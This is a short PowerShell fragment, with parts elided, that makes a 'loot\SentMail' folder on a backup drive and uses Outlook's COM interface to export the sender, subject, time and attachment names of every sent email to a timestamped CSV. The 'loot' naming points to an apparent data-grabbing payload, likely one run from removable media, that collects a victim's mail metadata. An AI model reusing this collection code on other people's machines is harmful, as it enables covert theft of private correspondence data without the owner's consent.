...
$TARGETDIR = $backupDrive + "\loot\SentMail"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}
...
$backupPath = $backupDrive + "\loot\SentMail\"
...
$Inbox = $namespace.getDefaultFolder($olFolders::olFolderSentMail)
$Inbox.items |Select-Object -Property Sendername,Subject,ReceivedTime,@{name="Attachments";expression={$_.Attachments|%{$_.DisplayName}}} | export-csv $backupPath\OutlookSentmail-$datetime.csv
}
